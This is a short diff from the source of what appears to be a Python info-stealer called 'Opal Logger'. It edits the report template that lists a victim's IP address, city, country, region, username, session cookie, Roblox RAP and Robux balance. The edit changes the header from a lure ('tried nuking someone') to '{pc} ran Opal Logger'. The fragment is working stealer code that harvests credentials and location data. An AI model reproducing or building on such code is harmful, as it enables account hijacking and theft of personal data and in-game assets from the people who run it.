@@ -218,7 +218,7 @@ steal = {
                     "author": {
                         "name": "Opal Logger",
                     },
-                    "description": f"{pc} tried nuking someone \n\n**token log:** ||coming soon||\n**IP:** ||{ip}||\n**City:** ||{city}||\n**Country:** ||{country}||\n**Region:** ||{region}||\n\n**username:** ||{User}||\n**Cookie:** ||{cookie}||\n**Rap:** ||{rap}||\n**Robux:** ||{rob}||",
+                    "description": f"{pc} ran Opal Logger \n\n**token log:** ||coming soon||\n**IP:** ||{ip}||\n**City:** ||{city}||\n**Country:** ||{country}||\n**Region:** ||{region}||\n\n**username:** ||{User}||\n**Cookie:** ||{cookie}||\n**Rap:** ||{rap}||\n**Robux:** ||{rob}||",
                     "color": 0x00C7FF,
                     
                     "footer": {
